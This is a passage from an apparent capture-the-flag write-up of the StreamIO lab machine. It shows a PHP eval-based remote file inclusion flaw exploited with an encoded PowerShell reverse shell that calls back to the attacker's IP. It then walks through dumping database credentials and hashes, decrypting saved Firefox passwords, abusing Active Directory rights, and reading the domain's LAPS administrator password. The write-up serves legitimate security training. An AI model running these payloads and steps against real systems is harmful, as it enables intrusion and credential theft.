</div>
<?php
} # while end
?>
<br><hr><br>
<h1>User managment</h1>
<?php
if(!defined('included'))
	die("Only accessable through includes");
if(isset($_POST['user_id']))
{
$query = "delete from users where is_staff = 0 and id = ".$_POST['user_id'];
$res = sqlsrv_query($handle, $query, array(), array("Scrollable"=>"buffered"));
}
$query = "select * from users where is_staff = 0";
$res = sqlsrv_query($handle, $query, array(), array("Scrollable"=>"buffered"));
while($row = sqlsrv_fetch_array($res, SQLSRV_FETCH_ASSOC))
{
?>

<div>
	<div class="form-control" style="height: 3rem;">
		<h4 style="float:left;"><?php echo $row['username']; ?></h4>
		<div style="float:right;padding-right: 25px;">
			<form method="POST">
				<input type="hidden" name="user_id" value="<?php echo $row['id']; ?>">
				<input type="submit" class="btn btn-sm btn-primary" value="Delete">
			</form>
		</div>
	</div>
</div>
<?php
} # while end
?>
<br><hr><br>
<form method="POST">
<input name="include" hidden>
</form>
<?php
if(isset($_POST['include']))
{
if($_POST['include'] !== "index.php" ) 
eval(file_get_contents($_POST['include']));
else
echo(" ---- ERROR ---- ");
}
?>
```
## RFI

This reveals the **Remote File Inclusion (RFI) vulnerability** that we can exploit.

```php
<?php
if(isset($_POST['include']))
{
if($_POST['include'] !== "index.php" ) 
eval(file_get_contents($_POST['include']));
else
echo(" ---- ERROR ---- ");
}
?>
```


- Takes user input from `$_POST['include']`
- Uses `file_get_contents()` to read the file/URL
- Executes the content with `eval()` (except for "index.php")

Create `shell.php` with reverse shell.

```php
system("powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AMQAyADIAIgAsADkAMAAwADEAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA");
```

```bash
$ python3 -m http.server 8080
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
```

```bash
$ rlwrap nc -lvnp 9001
listening on [any] 9001 ...
```

```bash
curl -k -X POST "https://streamio.htb/admin/?debug=master.php" \
  -H "Cookie: PHPSESSID=tnj9f7o4uctij2p3te5eqnnm1b" \
  -d "include=http://10.10.14.122:8080/shell.php"
```

```bash
$ rlwrap nc -lvnp 9001
listening on [any] 9001 ...
connect to [10.10.14.122] from (UNKNOWN) [10.129.87.124] 63803
whoami
streamio\yoshihide
PS C:\inetpub\streamio.htb\admin> 
```

```bash
PS C:\inetpub\streamio.htb> ls


    Directory: C:\inetpub\streamio.htb


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
d-----        2/22/2022   2:49 AM                admin                                                                 
d-----        2/22/2022   2:49 AM                css                                                                   
d-----        2/22/2022   2:49 AM                fonts                                                                 
d-----        2/22/2022   2:49 AM                images                                                                
d-----        2/22/2022   3:19 AM                js                                                                    
-a----        2/23/2022   2:16 AM           4341 about.php                                                             
-a----        2/23/2022   2:16 AM           1357 about_include.php                                                     
-a----        2/23/2022   2:16 AM           2908 contact.php                                                           
-a----        2/23/2022   2:16 AM           1706 contact_include.php                                                   
-a----        7/30/2021   1:57 AM           1150 favicon.ico                                                           
-a----        2/22/2022   3:21 AM           1812 header_include.php                                                    
-a----        2/25/2022  11:57 PM           7337 index.php                                                             
-a----        2/23/2022   2:16 AM           2415 info_include.php                                                      
-a----        2/26/2022   8:27 AM           3938 login.php                                                             
-a----        2/23/2022   2:16 AM            216 logout.php                                                            
-a----        2/25/2022  11:42 PM           4480 register.php                                                          


PS C:\inetpub\streamio.htb> cat register.php
<SNIP>
  else
  {
    $connection = array("Database"=>"STREAMIO", "UID" => "db_admin", "PWD" => 'B1@hx31234567890');
```

We see creds `db_admin:B1@hx31234567890`.

```bash
PS C:\inetpub\streamio.htb> where.exe sqlcmd
C:\Program Files\Microsoft SQL Server\Client SDK\ODBC\170\Tools\Binn\SQLCMD.EXE
PS C:\inetpub\streamio.htb> sqlcmd -S localhost -U db_admin -P B1@hx31234567890 -Q "select name from master..sysdatabases"
name                                                                                                                            
--------------------------------------------------------------------------------------------------------------------------------
master                                                                                                                          
tempdb                                                                                                                          
model                                                                                                                           
msdb                                                                                                                            
STREAMIO                                                                                                                        
streamio_backup                                                                                                                 

(6 rows affected)
```

```bash
PS C:\inetpub\streamio.htb> sqlcmd -S localhost -U db_admin -P B1@hx31234567890 -Q "SELECT name FROM streamio_backup..sysobjects WHERE xtype = 'U'"
name                                                                                                                            
--------------------------------------------------------------------------------------------------------------------------------
movies                                                                                                                          
users                                                                                                                           

(2 rows affected)
PS C:\inetpub\streamio.htb> sqlcmd -S localhost -U db_admin -P B1@hx31234567890 -Q "SELECT username,password FROM streamio_backup..Users"
username                                           password                                          
-------------------------------------------------- --------------------------------------------------
nikk37                                             389d14cb8e4e9b94b137deb1caf0612a                  
yoshihide                                          b779ba15cedfd22a023c4d8bcf5f2332                  
James                                              c660060492d9edcaa8332d89c99c9239                  
Theodore                                           925e5408ecb67aea449373d668b7359e                  
Samantha                                           083ffae904143c4796e464dac33c1f7d                  
Lauren                                             08344b85b329d7efd611b7a7743e8a09                  
William                                            d62be0dc82071bccc1322d64ec5b6c51                  
Sabrina                                            f87d3c0d6c8fd686aacc6627f1f493a5                  

(8 rows affected)
```

We get new users this time `nikk37`.

```powershell
PS C:\inetpub\streamio.htb> net users

User accounts for \\DC

-------------------------------------------------------------------------------
Administrator            Guest                    JDgodd                   
krbtgt                   Martin                   nikk37                   
yoshihide                
```

Crack `nikk37` hash.

```bash
hashcat -m 0 389d14cb8e4e9b94b137deb1caf0612a /usr/share/wordlists/rockyou.txt 
```

We get `get_dem_girls2@yahoo.com`.

```bash
$ evil-winrm -i 10.129.87.124 -u nikk37 -p get_dem_girls2@yahoo.com

*Evil-WinRM* PS C:\Users\nikk37\Documents> cd ..\Desktop
*Evil-WinRM* PS C:\Users\nikk37\Desktop> ls


    Directory: C:\Users\nikk37\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---       10/16/2025   9:58 AM             34 user.txt


*Evil-WinRM* PS C:\Users\nikk37\Desktop> cat user.txt
d56a02f9e0e08fca7f6ca97be932316e
```
# Privilege Escalation

WinPEAS gave this:

```powershell
*Evil-WinRM* PS C:\Users\nikk37\AppData\Roaming\Mozilla\Firefox\Profiles> ls


    Directory: C:\Users\nikk37\AppData\Roaming\Mozilla\Firefox\Profiles


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        2/22/2022   2:40 AM                5rwivk2l.default
d-----        2/22/2022   2:42 AM                br53rxeg.default-release


*Evil-WinRM* PS C:\Users\nikk37\AppData\Roaming\Mozilla\Firefox\Profiles> download br53rxeg.default-release
                                        
Info: Downloading C:\Users\nikk37\AppData\Roaming\Mozilla\Firefox\Profiles\br53rxeg.default-release to br53rxeg.default-release
                                        
Info: Download successful!
```

Might take time.
## Firefox Decrypt

```bash
git clone https://github.com/unode/firefox_decrypt.git
cd firefox_decrypt
```

```bash
$ python3 firefox_decrypt.py ../br53rxeg.default-release/
2025-10-16 07:24:03,934 - WARNING - profile.ini not found in ../br53rxeg.default-release/
2025-10-16 07:24:03,934 - WARNING - Continuing and assuming '../br53rxeg.default-release/' is a profile location

Website:   https://slack.streamio.htb
Username: 'admin'
Password: 'JDg0dd1s@d0p3cr3@t0r'

Website:   https://slack.streamio.htb
Username: 'nikk37'
Password: 'n1kk1sd0p3t00:)'

Website:   https://slack.streamio.htb
Username: 'yoshihide'
Password: 'paddpadd@12'

Website:   https://slack.streamio.htb
Username: 'JDgodd'
Password: 'password@12'
```

Save username and password.

```bash
$ cat user.txt
admin
nikk37
yoshihide
JDgodd

$ cat pass.txt
JDg0dd1s@d0p3cr3@t0r
n1kk1sd0p3t00:)
paddpadd@12
password@12
```

```bash
$ nxc smb 10.129.87.124 -u user.txt -p pass.txt
SMB         10.129.87.124   445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:streamIO.htb) (signing:True) (SMBv1:False)
SMB         10.129.87.124   445    DC               [-] streamIO.htb\admin:JDg0dd1s@d0p3cr3@t0r STATUS_LOGON_FAILURE
SMB         10.129.87.124   445    DC               [-] streamIO.htb\nikk37:JDg0dd1s@d0p3cr3@t0r STATUS_LOGON_FAILURE
SMB         10.129.87.124   445    DC               [-] streamIO.htb\yoshihide:JDg0dd1s@d0p3cr3@t0r STATUS_LOGON_FAILURE
SMB         10.129.87.124   445    DC               [+] streamIO.htb\JDgodd:JDg0dd1s@d0p3cr3@t0r
```
## Bloodhound Python

```bash
$ sudo ntpdate 10.129.87.124
2025-10-16 14:28:52.817042 (-0500) +25199.996798 +/- 0.038193 10.129.87.124 s1 no-leap
CLOCK: time stepped by 25199.996798

$ bloodhound-python -d streamio.htb -ns 10.129.87.124 -c all -u JDgodd -p 'JDg0dd1s@d0p3cr3@t0r'
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: streamio.htb
INFO: Getting TGT for user
INFO: Connecting to LDAP server: dc.streamio.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc.streamio.htb
INFO: Found 8 users
INFO: Found 54 groups
INFO: Found 4 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: DC.streamIO.htb
INFO: Done in 00M 14S
```

![[streamio12.png]]

![[streamio13.png]]

- `JDgodd` has `WriteOwner` permissions over the `CoreStaff` group
- Every member of the `CoreStaff` can read LASP passwords from the domain controller
#### Make `JDgodd` owner of Core Staff group

```bash
$ owneredit.py -dc-ip 10.129.87.124 -action write -new-owner "JDgodd" -target "Core Staff" streamio.htb/JDgodd:'JDg0dd1s@d0p3cr3@t0r'
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

[*] Current owner information below
[*] - SID: S-1-5-21-1470860369-1569627196-4264678630-1104
[*] - sAMAccountName: JDgodd
[*] - distinguishedName: CN=JDgodd,CN=Users,DC=streamIO,DC=htb
[*] OwnerSid modified successfully!
```
#### Grant WriteMembers permission

```bash
# create & activate a venv
python3 -m venv impenv
source impenv/bin/activate

# ensure pip is fresh
pip install --upgrade pip

# uninstall any leftover impacket in the venv (safe)
pip uninstall -y impacket

# install the compatible release
pip install impacket==0.10.0
```

```bash
source /opt/impenv/bin/activate
```

```bash
$ dacledit.py -action 'write' -rights 'WriteMembers' -principal 'JDgodd' -target "Core Staff" \
  streamio.htb/JDgodd:'JDg0dd1s@d0p3cr3@t0r' -dc-ip 10.129.87.124
Impacket v0.13.0.dev0+20251002.113829.eaf2e556 - Copyright Fortra, LLC and its affiliated companies 

[*] DACL backed up to dacledit-20251016-145012.bak
[*] DACL modified successfully!
```
### Add `JDgodd` to this group

```bash
$ net rpc group addmem "Core Staff" "JDgodd" -U streamio.htb/JDgodd%'JDg0dd1s@d0p3cr3@t0r' -I 10.129.87.124
```
#### Dump the LAPS passwords of the domain controller.

Use [pyLAPS](https://github.com/p0dalirius/pyLAPS).

```bash
$ python3 pyLAPS.py --dc-ip 10.129.87.124 -d streamio.htb -u JDgodd -p 'JDg0dd1s@d0p3cr3@t0r'
                 __    ___    ____  _____
    ____  __  __/ /   /   |  / __ \/ ___/
   / __ \/ / / / /   / /| | / /_/ /\__ \   
  / /_/ / /_/ / /___/ ___ |/ ____/___/ /   
 / .___/\__, /_____/_/  |_/_/    /____/    v1.2
/_/    /____/           @podalirius_           
    
[+] Extracting LAPS passwords of all computers ... 
  | DC$                  : +(-E3,]3g[o6+3
[+] All done!
```
## EvilWinRM

```bash
$ evil-winrm -i 10.129.87.124 -u Administrator -p '+(-E3,]3g[o6+3'

*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ..\Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> cat root.txt
Cannot find path 'C:\Users\Administrator\Desktop\root.txt' because it does not exist.
At line:1 char:1
+ cat root.txt
+ ~~~~~~~~~~~~
    + CategoryInfo          : ObjectNotFound: (C:\Users\Administrator\Desktop\root.txt:String) [Get-Content], ItemNotFoundException
    + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.GetContentCommand
*Evil-WinRM* PS C:\Users\Administrator\Desktop> ls
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd c:\users
*Evil-WinRM* PS C:\users> cd martin
*Evil-WinRM* PS C:\users\martin> ls


    Directory: C:\users\martin


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-r---        5/26/2022   4:56 PM                3D Objects
d-r---        5/26/2022   4:56 PM                Contacts
d-r---        5/26/2022   4:56 PM                Desktop
d-r---        5/26/2022   4:56 PM                Documents
d-r---        5/26/2022   4:56 PM                Downloads
d-r---        5/26/2022   4:56 PM                Favorites
d-r---        5/26/2022   4:56 PM                Links
d-r---        5/26/2022   4:56 PM                Music
d-r---        5/26/2022   4:56 PM                Pictures
d-r---        5/26/2022   4:56 PM                Saved Games
d-r---        5/26/2022   4:56 PM                Searches
d-r---        5/26/2022   4:56 PM                Videos


*Evil-WinRM* PS C:\users\martin> cd Desktop
*Evil-WinRM* PS C:\users\martin\Desktop> ls


    Directory: C:\users\martin\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---       10/16/2025   9:58 AM             34 root.txt


*Evil-WinRM* PS C:\users\martin\Desktop> cat root.txt
d5b97296af220586ba008eb8e124e308
```

`root.txt` is in Martin.

---